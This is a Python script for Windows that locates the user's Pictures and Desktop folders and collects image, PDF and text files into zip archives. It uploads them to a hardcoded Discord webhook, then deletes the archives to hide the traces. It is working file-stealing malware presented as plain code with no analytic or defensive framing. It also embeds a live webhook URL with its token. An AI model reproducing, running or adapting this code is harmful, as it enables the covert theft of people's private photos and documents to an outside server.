import requests
import os
from pathlib import Path
import time
import ctypes
from ctypes import wintypes
import zipfile
import sys
import random

def get_folders_from_csidl_codes(csidl_codes):
    SHGFP_TYPE_CURRENT = 0
    buf = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
    found_folders = []
    
    for csidl in csidl_codes:
        result = ctypes.windll.shell32.SHGetFolderPathW(None, csidl, None, SHGFP_TYPE_CURRENT, buf)
        if result == 0:  # Başarılı ise
            folder_path = buf.value
            if os.path.exists(folder_path):
                found_folders.append(folder_path)
            else:
                print(f"Warning: Found CSIDL {csidl} but path {folder_path} does not exist.")
        else:
            print(f"Warning: CSIDL {csidl} için klasör alınamadı.")
    
    return found_folders

def send_message_to_discord(webhook_url, message):
    data = {"content": message}
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 200:
            print(f"Message successfully sent: {message}")
        else:
            print(f"Failed to send message: {message}: {response.text}")
    except requests.RequestException as e:
        print(f"Failed to send message due to network error: {str(e)}")

def create_zip_files(folder_path):
    folder_path = Path(folder_path)
    zip_files = []
    current_zip = None
    current_zip_size = 0
    max_zip_size = 20 * 1024 * 1024  # Maximum zip size is 20 MB
    zip_counter = 1  # Start the naming from zip_1

    # İzin verilen uzantılar
    allowed_extensions = (
        '.jpg', '.jpeg',   # JPEG
        '.jp2',            # JPEG 2000
        '.jxr',            # JPEG XR (en yaygın uzantı)
        '.gif',            # GIF
        '.png',            # PNG
        '.apng',           # APNG
        '.tif', '.tiff',   # TIFF
        '.raw',            # RAW (temel)
        '.psd',            # PSD
        '.webp',           # WEBP
        '.eps',            # EPS
        '.ai',             # AI
        '.pdf',            # PDF
        '.svg',
        '.txt'             # TXT
    )

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if not file.lower().endswith(allowed_extensions):
                continue
            
            file_path = Path(root) / file
            file_size = os.path.getsize(file_path)
            if file_size > max_zip_size:
                print(f"{file_path} is skipped because it is larger than 20 MB.")
                continue

            # Yeni bir zip gerekli mi?
            if current_zip is None or current_zip_size + file_size > max_zip_size:
                if current_zip is not None:
                    current_zip.close()
                    zip_files.append(current_zip.filename)
                random_number = random.randint(100000, 999999)  # Generate a six-digit random number
                zip_filename = folder_path / f"zip_{zip_counter}_{random_number}.zip"
                current_zip = zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED)
                current_zip_size = 0
                zip_counter += 1

            current_zip.write(file_path, arcname=file_path.relative_to(folder_path))
            current_zip_size += file_size

    # Son bir zip dosyası kapatılmamış ise kapat
    if current_zip is not None:
        current_zip.close()
        zip_files.append(current_zip.filename)

    return zip_files

def send_all_files_in_folder(webhook_url, folder_path):
    print(f"Processing folder path: {folder_path}")

    send_message_to_discord(webhook_url, f"Archiving all files in {folder_path}...")
    zip_files = create_zip_files(folder_path)

    for zip_file in zip_files:
        if os.path.exists(zip_file):
            send_message_to_discord(webhook_url, f"Uploading: {zip_file}")
            with open(zip_file, 'rb') as file:
                file_data = file.read()
                files = {'file': (os.path.basename(zip_file), file_data, 'application/zip')}
                try:
                    response = requests.post(webhook_url, files=files)
                    if response.status_code == 200:
                        print(f"{zip_file} successfully uploaded.")
                    else:
                        print(f"Failed to upload {zip_file}: {response.text}")
                except requests.RequestException as e:
                    print(f"Failed to upload {zip_file} due to network error: {str(e)}")
            os.remove(zip_file)
            print(f"{zip_file} deleted.")
        else:
            print(f"Error: File does not exist {zip_file}")

# İstenen CSIDL değerleri
csidl_codes = [39, 0]

webhook_url = 'https://discord.com/api/webhooks/1246739297613254676/3gZ0SxFXd932ib6QNT-_GpBpfMSYmpwtGu1KFsiFtRaExwlWPpDHsrxx7LIKSzncnZSs'

folders = get_folders_from_csidl_codes(csidl_codes)

# Bulunan klasörleri tek tek işle
for folder in folders:
    send_all_files_in_folder(webhook_url, folder)

sys.exit()
